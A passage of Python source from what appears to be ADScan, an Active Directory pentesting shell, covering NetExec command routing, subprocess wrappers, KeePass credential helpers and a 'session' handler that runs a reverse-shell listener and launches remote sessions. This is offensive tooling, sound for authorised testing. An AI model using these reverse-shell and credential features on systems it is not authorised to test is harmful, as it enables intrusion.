    def _resolve_keepass2john_path() -> str | None:
        """Return the preferred keepass2john converter path."""
        from adscan_internal.services import JohnArtifactCrackingService

        return JohnArtifactCrackingService.resolve_converter_path("keepass2john")

    @staticmethod
    def _normalize_keepass_entry_username(username: str, domain: str) -> str:
        """Normalize KeePass usernames before domain credential validation."""
        normalized = str(username or "").strip()
        normalized_domain = str(domain or "").strip().casefold()
        if "\\" in normalized:
            prefix, suffix = normalized.split("\\", 1)
            if prefix.strip().casefold() in {
                normalized_domain,
                normalized_domain.split(".")[0],
            }:
                return suffix.strip()
        if "@" in normalized:
            local_part, realm = normalized.split("@", 1)
            if realm.strip().casefold() == normalized_domain:
                return local_part.strip()
        return normalized

    def _get_ai_service(self):
        """Get or create a cached AIService instance.

        Returns:
            AIService instance, or None when required dependencies are missing.
        """
        existing = getattr(self, "_ai_service", None)
        if existing is not None:
            return existing

        # In PyInstaller-frozen builds, some third-party Pydantic plugins
        # (e.g. logfire integration) can fail when trying to inspect source
        # code for dynamically-loaded modules.
        if getattr(sys, "frozen", False):
            os.environ.setdefault("PYDANTIC_DISABLE_PLUGINS", "__all__")

        ai_dependency_error_types: tuple[type[BaseException], ...] = ()
        try:
            from adscan_internal.services.ai_service import (
                AIDependencyError,
                AIService,
            )

            ai_dependency_error_types = (AIDependencyError,)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_error("Failed to load AI service modules.")
            print_exception(show_locals=False, exception=exc)
            return None

        try:
            from adscan_internal.services.ai_policy_executor import AIPolicyExecutor
            from adscan_internal.services.llm.config import load_ai_config

            config = load_ai_config()
            policy_executor = AIPolicyExecutor(
                shell=self,
                max_output_file_size_mb=config.ask.max_output_file_size_mb,
            )
            service = AIService(
                shell=self,
                policy_executor=policy_executor,
                config=config,
            )
            self._ai_service = service
            return service
        except Exception as exc:  # noqa: BLE001
            if ai_dependency_error_types and isinstance(exc, ai_dependency_error_types):
                print_error(str(exc))
                print_instruction(
                    "Install AI dependencies to enable `ask` (e.g. `pip install pydantic-ai`)."
                )
                return None
            telemetry.capture_exception(exc)
            print_error("Failed to initialize AI service.")
            print_exception(show_locals=False, exception=exc)
            return None

    def _restore_ntp_service(self):
        """Ensure system NTP synchronization is enabled before exiting."""
        if _is_full_adscan_container_runtime():
            # Docker runtime: restore host NTP using the host helper (best-effort).
            sock_path = os.getenv("ADSCAN_HOST_HELPER_SOCK", "").strip()
            if not sock_path:
                return
            try:
                from adscan_internal.host_privileged_helper import (
                    HostHelperError,
                    host_helper_client_request,
                )

                host_helper_client_request(
                    sock_path, op="timedatectl_set_ntp", payload={"value": True}
                )
            except (HostHelperError, OSError):
                pass
            return
        if shutil.which("timedatectl") is None:
            return
        try:
            self.run_command("timedatectl set-ntp true", timeout=60, ignore_errors=True)
            print_info_debug("Timedatectl set to true")
        except Exception as e:
            telemetry.capture_exception(e)
            pass

        # Start the output processor thread
        # if hasattr(self, '_stop_output_processor') and hasattr(self, '_output_processor_loop'):
        #     self._stop_output_processor.clear()
        #     print_info_debug("[DEBUG][__init__] Attempting to start _output_processor_thread...")
        #     self._output_processor_thread = threading.Thread(target=self._output_processor_loop, daemon=True)
        #     self._output_processor_thread.name = "OutputProcessorThread"
        #     self._output_processor_thread.start()
        #     print_info_debug(f"[DEBUG][__init__] _output_processor_thread.start() called. Is alive: {self._output_processor_thread.is_alive()}")
        # else:
        #     print_info_debug("[CRITICAL][__init__] Output processor attributes not fully initialized. Thread not started.")

        # Start auto-save thread every minute - ensure it's started only once if __init__ is complex
        if (
            not hasattr(self, "_auto_save_thread_started")
            or not self._auto_save_thread_started
        ):
            auto_save_thread = threading.Thread(target=self.auto_save, daemon=True)
            auto_save_thread.start()
            self.background_tasks.append(auto_save_thread)  # Ensure thread is tracked
            self._auto_save_thread_started = True
        if os.path.exists(self.technical_report_file):
            try:
                with open(self.technical_report_file, "r", encoding="utf-8") as f:
                    technical_report = json.load(f)
                build_report_model = load_optional_pro_attr(
                    "adscan_internal.pro.reporting.report_builder",
                    "build_report_model",
                    action="Technical report cache hydration",
                    debug_printer=print_info_debug,
                    prefix="[report-cache]",
                )
                if not callable(build_report_model):
                    build_report_model = None

                if build_report_model is not None:
                    model = build_report_model(technical_report)
                    self.report = {
                        entry["name"]: {
                            "vulnerabilities": entry.get("vulnerabilities", {})
                        }
                        for entry in model.get("domains", [])
                        if isinstance(entry, dict) and entry.get("name")
                    }
            except Exception as e:
                telemetry.capture_exception(e)
                print_error(
                    f"Error loading technical report cache: {self.technical_report_file}"
                )
        self.type = None  # Initialize pentest type (ctf or audit)
        self.lab_provider = (
            None  # Lab provider for CTF workspaces (HTB, TryHackMe, etc.)
        )
        self.lab_name = None  # Specific lab/machine name for CTF workspaces (e.g., "Forest" for HTB)
        self.lab_name_whitelisted = None  # Whether lab_name is in whitelist (None if no lab_name, True/False if lab_name exists)

    def _extract_domain_from_netexec_command(self, command: str) -> str | None:
        """Extract domain name from a NetExec command string.

        Extraction priority:
        1. First, extract from the `-d` or `--domain` parameter if present
        2. Fallback: Extract from the FQDN that comes after the service command
           (e.g., "smb forest.htb.local" -> extract "htb.local" by removing hostname)

        Args:
            command: NetExec command string to analyze.

        Returns:
            str | None: Extracted domain name, or None if not found.
        """
        from adscan_internal.integrations.netexec.helpers import (
            extract_domain_from_netexec_command,
        )

        domain, debug_messages = extract_domain_from_netexec_command(command)
        for msg in debug_messages:
            # Keep debug output behavior, but apply markers where we can.
            # We only mark the last token when it looks like a domain.
            try:
                parts = msg.rsplit(" ", 1)
                if len(parts) == 2 and "." in parts[1]:
                    msg = parts[0] + " " + mark_sensitive(parts[1], "domain")
            except Exception:
                pass
            print_info_debug(f"[_extract_domain_from_netexec_command] {msg}")
        return domain

    def _detect_output_redirection(self, command: str) -> tuple[bool, str | None]:
        """Detect if command has output redirection to a file.

        Detects redirections like:
        - `> file.txt`
        - `>> file.txt`
        - `> file.txt 2>&1`
        - `>> file.txt 2>&1`
        - `| command > file.txt`
        - `| command >> file.txt`

        Args:
            command: Command string to analyze.

        Returns:
            tuple: (has_redirection, file_path) where:
                - has_redirection: True if redirection detected
                - file_path: Path to output file if detected, None otherwise
        """
        from adscan_internal.integrations.netexec.helpers import (
            detect_output_redirection,
        )

        return detect_output_redirection(command)

    def _check_redirected_file_has_content(self, file_path: str) -> bool:
        """Check if a redirected output file exists and has content.

        Args:
            file_path: Path to the file to check.

        Returns:
            bool: True if file exists and has non-empty content, False otherwise.
        """
        from adscan_internal.integrations.netexec.helpers import (
            redirected_file_has_content,
        )

        return redirected_file_has_content(
            file_path,
            expand_user=_expand_effective_user_path,
        )

    def _run_netexec(
        self,
        command: str,
        *,
        domain: str | None = None,
        timeout: int | None = None,
        pre_sync: bool = True,
        **kwargs,
    ) -> subprocess.CompletedProcess[str] | None:
        """Run a NetExec command using the shared NetExec runner."""
        from adscan_internal.integrations.netexec.runner import (
            NetExecContext,
            NetExecRunner,
        )

        runner = getattr(self, "_netexec_runner", None)
        if runner is None:
            runner = NetExecRunner(
                command_runner=self.command_runner,
            )
            setattr(self, "_netexec_runner", runner)

        ctx = NetExecContext(
            state_owner=self,
            default_domain=getattr(self, "domain", None),
            extract_domain=self._extract_domain_from_netexec_command,
            is_domain_configured=lambda value: (
                value in getattr(self, "domains_data", {})
            ),
            sync_clock_with_pdc=lambda value: bool(
                self.do_sync_clock_with_pdc(value, verbose=True)
            ),
            detect_output_redirection=self._detect_output_redirection,
            redirected_file_has_content=self._check_redirected_file_has_content,
            clean_workspaces=lambda use_sudo: bool(
                self._clean_netexec_workspaces(use_sudo_if_needed=use_sudo)
            ),
            get_workspaces_dir=self._get_nxc_workspaces_dir,
            confirm_ask=lambda question, default: Confirm.ask(
                question, default=default
            ),
            refresh_delegated_ticket=lambda ticket_path: (
                self.refresh_last_delegated_service_ticket(ticket_path)
            ),
        )

        return runner.run(
            command,
            ctx=ctx,
            domain=domain,
            timeout=timeout,
            pre_sync=pre_sync,
            **kwargs,
        )

    def run_command(
        self,
        command: str,
        *,
        timeout: int | None = None,
        shell: bool = True,
        capture_output: bool = True,
        text: bool = True,
        check: bool = False,
        env: dict[str, str] | None = None,
        cwd: str | None = None,
        ignore_errors: bool = False,
        use_clean_env: bool | None = None,
        **kwargs,
    ) -> subprocess.CompletedProcess[str] | None:
        """
        Execute a blocking command via the injected command runner.

        By default, automatically uses clean_env for external commands to avoid
        PyInstaller library conflicts. Set use_clean_env=False to disable, or
        use_clean_env=True to force it even for Python commands.

        NetExec commands are automatically detected and handled with error
        handling and retry logic. If the command contains the NetExec path, it will
        be routed through ``_run_netexec()`` which automatically handles common
        NetExec errors (e.g., ``KRB_AP_ERR_SKEW``, ``SCHED_S_TASK_HAS_NOT_RUN``).

        Args:
            command: Command string to execute
            timeout: Optional timeout in seconds
            shell: Whether to use shell execution (default: True)
            capture_output: Whether to capture stdout/stderr (default: True)
            text: Whether to return strings instead of bytes (default: True)
            check: Whether to raise exception on non-zero exit code (default: False)
            env: Environment variables (if None and use_clean_env is True/None, auto-detect)
            cwd: Working directory for command
            ignore_errors: Whether to ignore exceptions (default: False)
            use_clean_env: If True, always use clean_env. If False, never use it.
                          If None (default), auto-detect based on command type.
            **kwargs: Additional arguments passed to subprocess.run
        """
        # Never pass invisible sensitive markers to external binaries.
        command = strip_sensitive_markers(command)

        # Auto-detect NetExec/NXC commands and route them through the error handling helper
        netexec_path = getattr(self, "netexec_path", None)
        if _is_netexec_like_command(command, netexec_path):
            # This is a NetExec command - use the specialized helper
            return self._run_netexec(
                command,
                domain=None,  # Will be auto-extracted from command or use self.domain
                timeout=timeout,
                pre_sync=False,  # Only sync on error, not preemptively
                shell=shell,
                capture_output=capture_output,
                text=text,
                check=check,
                env=env,
                cwd=cwd,
                ignore_errors=ignore_errors,
                use_clean_env=use_clean_env,
                **kwargs,
            )

        # For non-NetExec commands, log the command about to be executed.
        try:
            print_info_debug(f"[cmd] Running: {command}")
        except Exception:
            # Logging should never break execution flow
            pass

        # Auto-detect if clean_env is needed (unless explicitly set)
        if use_clean_env is None:
            use_clean_env = _command_string_needs_clean_env(command)

        # Apply clean_env if needed and env not explicitly provided
        if use_clean_env and env is None:
            env = _get_clean_env_for_compilation()

        try:
            spec = CommandSpec(
                command=command,
                timeout=timeout,
                shell=shell,
                capture_output=capture_output,
                text=text,
                check=check,
                env=env,
                cwd=cwd,
                extra=kwargs or None,
            )
            result = self.command_runner.run(spec)
            elapsed_seconds = getattr(result, "_adscan_elapsed_seconds", None)
            duration_text = (
                f"{float(elapsed_seconds):.3f}s"
                if isinstance(elapsed_seconds, (int, float))
                else "unknown"
            )
            # Reset last error marker on success
            setattr(self, "_last_run_command_error", None)

            # Log a concise summary and truncated preview of the command output.
            try:
                stdout_raw = result.stdout or ""
                stderr_raw = result.stderr or ""
                stdout = strip_ansi_codes(stdout_raw)
                stderr = strip_ansi_codes(stderr_raw)
                stdout_lines = [line for line in stdout.splitlines() if line.strip()]
                stderr_lines = [line for line in stderr.splitlines() if line.strip()]

                print_info_debug(
                    "[cmd] Result: "
                    f"exit_code={result.returncode}, "
                    f"stdout_lines={len(stdout_lines)}, "
                    f"stderr_lines={len(stderr_lines)}, "
                    f"duration={duration_text}"
                )

                preview: list[str] = []
                head = stdout_lines[:10]
                tail = (
                    stdout_lines[-10:] if len(stdout_lines) > 20 else stdout_lines[10:]
                )
                if head:
                    preview.append("STDOUT (head):")
                    preview.extend(head)
                if tail:
                    preview.append("STDOUT (tail):")
                    preview.extend(tail)
                if stderr_lines:
                    preview.append("STDERR (head):")
                    preview.extend(stderr_lines[:10])
                    stderr_tail = (
                        stderr_lines[-10:]
                        if len(stderr_lines) > 20
                        else stderr_lines[10:]
                    )
                    if stderr_tail:
                        preview.append("STDERR (tail):")
                        preview.extend(stderr_tail)

                if preview:
                    print_info_debug(
                        "[cmd] Output preview:\n" + "\n".join(preview),
                        panel=True,
                    )
            except Exception:
                # Never let logging failures affect command flow
                pass

            return result
        except subprocess.TimeoutExpired as exc:
            if not ignore_errors:
                timeout_preview = ""
                try:
                    timeout_preview = build_timeout_output_preview(
                        exc,
                        stdout_head=20,
                        stdout_tail=20,
                        stderr_head=20,
                        stderr_tail=20,
                    )
                    if timeout_preview:
                        print_info_debug(
                            "[cmd] Timeout output preview:\n" + timeout_preview,
                            panel=True,
                        )
                except Exception:
                    timeout_preview = ""
                telemetry.capture_exception(
                    exc,
                    properties={
                        "command": command,
                        "timeout_seconds": timeout,
                        "output_preview": timeout_preview or None,
                    },
                )
                try:
                    print_error_verbose(
                        f"Command timed out after {timeout if timeout is not None else 'unknown'}s: "
                        f"{command}"
                    )
                except Exception:
                    pass
            # Mark last error as timeout so callers can react appropriately
            setattr(self, "_last_run_command_error", ("timeout", exc))
            return None
        except Exception as exc:
            if not ignore_errors:
                telemetry.capture_exception(exc)
            # Mark last error as generic failure
            setattr(self, "_last_run_command_error", ("error", exc))
            return None

    def spawn_command(
        self,
        command,  # str or list[str]
        *,
        shell: bool = True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text: bool = True,
        env: dict[str, str] | None = None,
        cwd: str | None = None,
        ignore_errors: bool = False,
        use_clean_env: bool | None = None,
        **kwargs,
    ) -> subprocess.Popen[str] | None:
        """Launch a non-blocking command using subprocess.Popen.

        This mirrors ``run_command()`` in how it decides whether to apply a
        clean environment for external tools to avoid PyInstaller library
        conflicts (SIGBUS / Bus error), especially for netexec and other
        binaries installed in tool venvs.

        Args:
            command: Command string (for ``shell=True``) or list of arguments.
            shell: Whether to execute via the system shell.
            stdout: Stream for standard output.
            stderr: Stream for standard error.
            text: If True, use text mode for I/O.
            env: Explicit environment to use; if None, a clean env may be
                auto-applied based on ``use_clean_env`` and command type.
            cwd: Working directory for the spawned process.
            ignore_errors: If False, unexpected exceptions are sent to telemetry.
            use_clean_env: If True, always use a clean env; if False, never
                use it; if None, auto-detect based on command type.

        Returns:
            A ``subprocess.Popen`` instance on success, or ``None`` on failure.
        """
        try:
            # Never pass invisible sensitive markers to external binaries.
            if isinstance(command, str):
                command = strip_sensitive_markers(command)
            else:
                command = [strip_sensitive_markers(str(arg)) for arg in command]
            # Auto-detect and apply clean_env when env is not explicitly provided.
            if env is None:
                # Decide whether a clean env is needed.
                if use_clean_env is None:
                    if shell:
                        # Command may be a string or list; normalize to string.
                        if isinstance(command, str):
                            command_str = command
                        else:
                            command_str = " ".join(str(arg) for arg in command)
                        use_clean_env = _command_string_needs_clean_env(command_str)
                    else:
                        # Non-shell mode: normalize to a list for analysis.
                        if isinstance(command, str):
                            command_list = shlex.split(command)
                        else:
                            command_list = list(command)
                        use_clean_env = _command_needs_clean_env(command_list)

                if use_clean_env:
                    env = _get_clean_env_for_compilation()

            return subprocess.Popen(
                command,
                shell=shell,
                stdout=stdout,
                stderr=stderr,
                text=text,
                env=env,
                cwd=cwd,
                **kwargs,
            )
        except Exception as exc:
            if not ignore_errors:
                telemetry.capture_exception(exc)
            return None

    def run_external_command(
        self, command, timeout=None, blocking=True, ignore_errors=False, **kwargs
    ):
        """
        Backwards-compatible wrapper around run_command/spawn_command.
        """
        if blocking:
            options = dict(kwargs)
            shell_flag = options.pop("shell", True)
            capture_output = options.pop("capture_output", True)
            text_mode = options.pop("text", True)
            check_flag = options.pop("check", False)
            env = options.pop("env", None)
            cwd = options.pop("cwd", None)
            return self.run_command(
                command,
                timeout=timeout,
                shell=shell_flag,
                capture_output=capture_output,
                text=text_mode,
                check=check_flag,
                env=env,
                cwd=cwd,
                ignore_errors=ignore_errors,
                **options,
            )

        popen_kwargs = dict(kwargs)
        shell_flag = popen_kwargs.pop("shell", True)
        stdout_stream = popen_kwargs.pop("stdout", subprocess.PIPE)
        stderr_stream = popen_kwargs.pop("stderr", subprocess.PIPE)
        text_mode = popen_kwargs.pop("text", True)
        env = popen_kwargs.pop("env", None)
        cwd = popen_kwargs.pop("cwd", None)
        return self.spawn_command(
            command,
            shell=shell_flag,
            stdout=stdout_stream,
            stderr=stderr_stream,
            text=text_mode,
            env=env,
            cwd=cwd,
            ignore_errors=ignore_errors,
            **popen_kwargs,
        )

    def _output_processor_loop(self):
        print_info_debug("[OutputThread] Loop function started.")
        try:
            while (
                not self._stop_output_processor.is_set()
                or not self.output_queue.empty()
            ):
                try:
                    item_type, item_payload = self.output_queue.get(timeout=0.1)
                except queue.Empty as e:
                    telemetry.capture_exception(e)
                    continue  # No item, continue to check stop_event or queue status

                if item_type == "PRINT":
                    print_args, print_kwargs = item_payload
                    print_kwargs.setdefault("end", "\n")
                    # REMOVED: print_kwargs.setdefault('flush', True) as rich.Console.print doesn't use it
                    try:
                        self.console.print(*print_args, **print_kwargs)
                    except Exception as e_print:
                        telemetry.capture_exception(e_print)
                        if DEBUG_MODE:
                            print(
                                f"[ERROR][OutputThread] Exception during console.print: {e_print}",
                                file=sys.stderr,
                            )

                elif item_type == "PROMPT":
                    (
                        prompt_id,
                        prompt_type_for_queue,
                        question_text,
                        default_value,
                        choices_value,
                        password_value,
                    ) = item_payload
                    actual_result = None
                    try:
                        # >>> START OF MODIFICATION <<<
                        with self.prompt_interaction_lock:
                            self.is_sub_prompt_active = True
                        # >>> END OF MODIFICATION <<<
                        if DEBUG_MODE:
                            print(
                                f"[DEBUG][OutputThread] Processing prompt {prompt_id}: '{str(question_text)[:50]}...' type: {prompt_type_for_queue}",
                                file=sys.stderr,
                            )

                        # Create a new Console instance specifically for this input operation
                        # This helps ensure Rich's input handling is not affected by shared state
                        # or terminal modes potentially set by prompt_toolkit via self.console.
                        input_console = _build_rich_console(
                            theme=ADSCAN_THEME, strip_markers=True
                        )

                        # Comparisons reverted to strings to match what queued_prompt sends
                        if prompt_type_for_queue == "choice":
                            actual_result = Prompt.ask(
                                question_text,
                                choices=choices_value,
                                default=default_value,
                                console=input_console,
                            )
                        elif prompt_type_for_queue == "password":
                            actual_result = Prompt.ask(
                                question_text, password=True, console=input_console
                            )
                        elif prompt_type_for_queue == "confirm":
                            actual_result = Confirm.ask(
                                question_text,
                                default=default_value,
                                console=input_console,
                            )
                        # elif prompt_type_for_queue == 'int': # Example if IntPrompt is added (using string)
                        #     actual_result = IntPrompt.ask(question_text, default=default_value, console=self.console)
                        elif prompt_type_for_queue == "general_text":
                            actual_result = Prompt.ask(
                                question_text,
                                default=str(default_value)
                                if default_value is not None
                                else "",
                                console=input_console,
                            )
                        else:
                            err_msg = f"Unknown prompt type: {prompt_type_for_queue}"
                            print(f"[ERROR][OutputThread] {err_msg}", file=sys.stderr)
                            print_error(f"Error: {err_msg} in _output_processor_loop")
                            actual_result = ValueError(err_msg)  # Store error as result

                        if DEBUG_MODE:
                            print(
                                f"[DEBUG][OutputThread] Prompt {prompt_id} got result: {str(actual_result)[:50]}",
                                file=sys.stderr,
                            )

                    except Exception as e_rich_prompt:
                        telemetry.capture_exception(e_rich_prompt)
                        print(
                            f"[ERROR][OutputThread] Exception during rich.prompt for {prompt_id} ('{str(question_text)[:50]}...'): {e_rich_prompt}",
                            file=sys.stderr,
                        )
                        actual_result = e_rich_prompt  # Store exception as result
                    finally:
                        # >>> START OF MODIFICATION <<<
                        with self.prompt_interaction_lock:
                            self.is_sub_prompt_active = False
                        # >>> END OF MODIFICATION <<<
                        # CRITICAL: Ensure the waiting thread is unblocked even if rich.prompt fails.
                        self.prompt_results[prompt_id] = (
                            actual_result  # Correct variable
                        )
                        if prompt_id in self.prompt_events:
                            self.prompt_events[prompt_id].set()
                            if DEBUG_MODE:
                                print_info_debug(
                                    f"[DEBUG][OutputThread] Event set for prompt {prompt_id}"
                                )
                        else:
                            # This case should ideally not happen if prompt_id is always added to prompt_events before queuing
                            print_info_debug(
                                f"[ERROR][OutputThread] prompt_id {prompt_id} not found in prompt_events after processing."
                            )

                elif item_type == "STOP_PROCESSOR":  # Handle sentinel
                    if DEBUG_MODE:
                        print_info_debug(
                            "[DEBUG][OutputThread] STOP_PROCESSOR received, exiting loop."
                        )
                    break

                self.output_queue.task_done()

        except (
            Exception
        ) as e_loop_fatal:  # Catch broader exceptions that could kill the loop
            telemetry.capture_exception(e_loop_fatal)
            print_info_debug(
                f"[CRITICAL][OutputThread] _output_processor_loop DIED: {e_loop_fatal}"
            )
            # Attempt to signal all waiting prompts about the failure
            # Iterate over a copy of items in case the dictionary is modified elsewhere (though unlikely here)
            for pid, event in list(self.prompt_events.items()):
                if not event.is_set():  # Check if event is not already set
                    self.prompt_results[pid] = RuntimeError(
                        f"_output_processor_loop died: {e_loop_fatal}"
                    )
                    event.set()
                    if DEBUG_MODE:
                        print_info_debug(
                            f"[DEBUG][OutputThread] Force-signaled event for prompt {pid} due to loop death."
                        )
        finally:
            print_info_debug("[OutputThread] Loop function ended.")

    def queued_print(self, *args, **kwargs):
        """Queues a print operation."""
        if hasattr(self, "output_queue"):
            self.output_queue.put(("PRINT", (args, kwargs)))
        else:  # Fallback if queue is not initialized
            print("[FALLBACK PRINT]", *args, **kwargs, file=sys.stderr)

    def queued_prompt(self, question_text, default=None, choices=None, password=False):
        """Queues a prompt operation (Confirm or Prompt.ask) and waits for the result."""
        if (
            not hasattr(self, "output_queue")
            or not hasattr(self, "prompt_events")
            or not hasattr(self, "prompt_results")
        ):
            # Fallback if queue system is not initialized - this might be problematic for real prompts
            if DEBUG_MODE:
                print(
                    f"[FALLBACK PROMPT ATTEMPT] {question_text} (default: {default}) - Queue system not ready.",
                    file=sys.stderr,
                )
            # Depending on strictness, could raise an error or return a default/None
        if default is not None:
            return default
        if choices:
            return choices[0] if isinstance(choices, list) and choices else None
        return None  # Or raise RuntimeError("Queue system not initialized for prompt")

        prompt_id = str(uuid.uuid4())
        event = threading.Event()
        self.prompt_events[prompt_id] = event

        # Determine prompt_type_for_queue based on arguments
        prompt_type_for_queue = "general_text"  # Default to general text input
        if choices is not None:
            prompt_type_for_queue = "choice"
        elif password:
            prompt_type_for_queue = "password"
        elif isinstance(default, bool):
            prompt_type_for_queue = "confirm"
        elif default is None:  # If default is None, could be confirm or general text
            normalized_question = str(
                question_text
            ).lower()  # Ensure question_text is string for .lower()
            # Heuristic: if question implies y/n, it's confirm.
            if any(
                s in normalized_question
                for s in ["(y/n)", "(yes/no)", "y/n?", "yes/no?"]
            ):
                prompt_type_for_queue = "confirm"
            # Else, it remains 'general_text' (which will use Prompt.ask for general input)

        self.output_queue.put(
            (
                "PROMPT",
                (
                    prompt_id,
                    prompt_type_for_queue,
                    question_text,
                    default,
                    choices,
                    password,
                ),
            )
        )

        event.wait()

        result = self.prompt_results.pop(prompt_id)
        # self.prompt_events.pop(prompt_id, None) # Clean up event - already popped by waiting thread
        del self.prompt_events[prompt_id]

        if isinstance(result, Exception):
            raise result
        return result

    def queued_print_info(self, message: str):
        """Queues an informational message for printing, respecting VERBOSE_MODE."""
        if VERBOSE_MODE:
            # Remove potential existing prefix to avoid duplication like [*] [*]
            clean_message = message.removeprefix("[*] ").strip()
            from adscan_internal.rich_output import BRAND_COLORS

            self.queued_print(f"[*] {clean_message}", style=BRAND_COLORS["info"])

    def queued_print_success(self, message: str):
        """Queues a success message for printing."""
        clean_message = message.removeprefix("[+] ").strip()
        self.queued_print(f"[+] {clean_message}", style="green")

    def queued_print_warning(self, message: str):
        """Queues a warning message for printing."""
        clean_message = message.removeprefix("[!] ").strip()
        self.queued_print(f"[!] {clean_message}", style="yellow")

    def queued_print_error(self, message: str):
        """Queues an error message for printing."""
        clean_message = message.removeprefix("[-] ").strip()
        self.queued_print(f"[-] {clean_message}", style="bold red")

    def queued_print_instruction(self, message: str):
        """Queues an instruction message for printing."""
        # Instructions typically don't have prefixes like [+] or [-]
        self.queued_print(f"   {message.strip()}", style="dim")

    def signal_handler(self, _signum, _frame):
        """Handles the interrupt signal (Ctrl+C) gracefully."""
        global _SESSION_CAPTURE_FINALIZED
        if getattr(self, "_shutdown_in_progress", False):
            print_warning("Shutdown already in progress. Please wait...")
            return

        signal_name = str(_signum)
        try:
            signal_name = signal.Signals(_signum).name
        except Exception:
            pass
        _log_interrupt_debug(
            kind="signal", source=f"pentestshell.signal_handler:{signal_name}"
        )

        print("")
        print_warning("Ctrl+C detected. Attempting graceful shutdown...")
        print_info_verbose("Saving data before exiting...")
        print_info_debug("Signal handler invoked; running graceful shutdown")

        try:
            self.do_exit(exit=False)
        except Exception as e:
            telemetry.capture_exception(e)
            print_error("Error saving data.")
            print_exception(show_locals=False, exception=e)
        finally:
            if (
                hasattr(self, "_output_processor_thread")
                and self._output_processor_thread
                and self._output_processor_thread.is_alive()
            ):
                if hasattr(self, "queued_print"):
                    print_info("Shutting down output processor due to signal...")
                else:
                    print_info_verbose(
                        "Shutting down output processor due to signal..."
                    )

                if hasattr(self, "_stop_output_processor"):
                    self._stop_output_processor.set()
                if hasattr(self, "output_queue") and self.output_queue is not None:
                    self.output_queue.put(("STOP_PROCESSOR", None))
                    try:
                        self.output_queue.join()
                    except Exception as e:
                        telemetry.capture_exception(e)
                        # Use console for debug print if available
                        print_info_debug(
                            f"Exception during output_queue.join() on signal_handler: {e}"
                        )

                self._output_processor_thread.join(timeout=2.0)
                if self._output_processor_thread.is_alive():
                    print_info_verbose(
                        "Output processor thread did not terminate cleanly on signal."
                    )
                else:
                    print_info_verbose("Output processor shut down on signal.")
            elif hasattr(self, "_output_processor_thread"):
                print_info_verbose(
                    "Output processor was not running or already stopped on signal."
                )
            else:
                print_info_verbose(
                    "Output processor attributes not found on signal, cannot manage thread."
                )

            print_info_verbose("adscan terminated by signal.")
            if not getattr(self, "_shutdown_in_progress", False):
                command_type = _resolve_command_type(shell=self)
                if _is_session_capture_allowed(command_type):
                    metadata = _build_command_metadata(shell=self)
                    telemetry.capture_session_end(
                        console=TELEMETRY_CONSOLE, metadata=metadata
                    )
                _SESSION_CAPTURE_FINALIZED = True
            sys.exit(0)

    def auto_save(self):
        """Executes workspace_save every 5 seconds in a background thread."""
        while True:
            time.sleep(5)  # Wait 5 seconds
            try:
                self.workspace_save()
            except Exception as e:
                telemetry.capture_exception(e)
                print_error(f"Error during auto-save: {str(e)}")

    # =========================================================================
    # Remote sessions (reverse shells, etc.)
    # =========================================================================

    def do_session(self, args: str):
        """
        Manage remote sessions and the reverse-shell listener.

        Usage:
          session listener start [lhost] [lport]
          session listener stop
          session listener status
          session list
          session use <id>
          session kill <id>
          session current
          session interact [id]
          session payload <windows|linux> [lhost] [lport]
          session rename <id> <alias>
          session info [id]
          session interfaces
          session launch <smb|winrm> <host> <domain> <username> <password> [windows|linux]
          session connect <host> <port> [alias]
          session download <remote_path> [download_dir]
          session upload <local_path> <remote_path>
          session system <command>
          session shell [id]
          session agent attach [id]
          session launch <smb|winrm> <host> <domain> <username> <password> [windows|linux]

        Notes:
          - The listener accepts plain TCP reverse shells and registers each
            incoming connection as a new session.
          - Integration with specific tooling (netexec, etc.) can build on top
            of this handler by generating appropriate payloads.
        """
        from adscan_internal.rich_output import mark_sensitive

        if not args:
            current = self.session_manager.get_current_session()
            if current is None:
                print_warning("No active session selected.")
            else:
                print_success(
                    f"Current session: #{current.id} "
                    f"({current.type.value} {current.peer_address[0]}:{current.peer_address[1]})"
                )
            print_instruction(
                "Usage: session <listener|list|use|kill|current|interact|payload|"
                "interfaces|launch|connect|download|upload|system|shell|agent> ..."
            )
            return

        parts = args.split()
        command = parts[0]
        sub_args = parts[1:]

        if command == "listener":
            if not sub_args:
                print_instruction(
                    "Usage: session listener <start [lhost] [lport]|stop|status>"
                )
                return
            action = sub_args[0]
            if action == "start":
                # Defaults: current myip or 0.0.0.0, port 4444
                lhost = (
                    sub_args[1]
                    if len(sub_args) >= 2
                    else getattr(self, "myip", "0.0.0.0") or "0.0.0.0"
                )
                # If the user specified a port, respect it. Otherwise try
                # common egress ports first (443, then 80) and fall back to
                # 4444 for lab environments.
                if len(sub_args) >= 3:
                    try:
                        lport = int(sub_args[2])
                    except ValueError:
                        print_error("Listener port must be an integer.")
                        return
                    self.session_manager.start_listener(lhost, lport)
                else:
                    candidate_ports = [443, 80, 4444]
                    for lport in candidate_ports:
                        if self.session_manager.start_listener(lhost, lport):
                            break
                    else:
                        print_error(
                            "Failed to start listener on ports 443, 80, or 4444. "
                            "Try specifying a custom port explicitly."
                        )
            elif action == "stop":
                self.session_manager.stop_listener()
            elif action == "status":
                if self.session_manager.is_listener_running():
                    bind = self.session_manager.get_listener_bind()
                    if bind:
                        print_success(
                            f"Listener running on {bind[0]}:{bind[1]} (reverse_tcp)."
                        )
                    else:
                        print_success("Listener is running.")
                else:
                    print_warning("No active listener.")
            else:
                print_error(
                    f"Unknown listener action '{action}'. Use: start, stop, or status."
                )

        elif command == "list":
            sessions = self.session_manager.list_sessions()
            if not sessions:
                print_warning("No active sessions.")
                return

            table = Table(
                title="[bold]Active Sessions[/bold]",
                show_header=True,
                header_style="bold cyan",
                border_style="cyan",
            )
            table.add_column("ID", style="bold")
            table.add_column("Alias")
            table.add_column("Type")
            table.add_column("Peer")
            table.add_column("Created (UTC)")
            table.add_column("Current")

            current = self.session_manager.get_current_session()
            current_id = current.id if current is not None else None

            for session in sessions:
                peer = f"{session.peer_address[0]}:{session.peer_address[1]}"
                created = session.created_at.strftime("%Y-%m-%d %H:%M:%S")
                is_current = "✓" if session.id == current_id else ""
                table.add_row(
                    str(session.id),
                    session.alias or "",
                    session.type.value,
                    peer,
                    created,
                    is_current,
                )

            self.console.print(table)

        elif command == "use":
            if not sub_args:
                print_error("Usage: session use <id>")
                return
            try:
                session_id = int(sub_args[0])
            except ValueError:
                print_error("Session id must be an integer.")
                return

            if self.session_manager.set_current_session(session_id):
                self.current_session = self.session_manager.get_current_session()

        elif command == "kill":
            if not sub_args:
                print_error("Usage: session kill <id>")
                return
            try:
                session_id = int(sub_args[0])
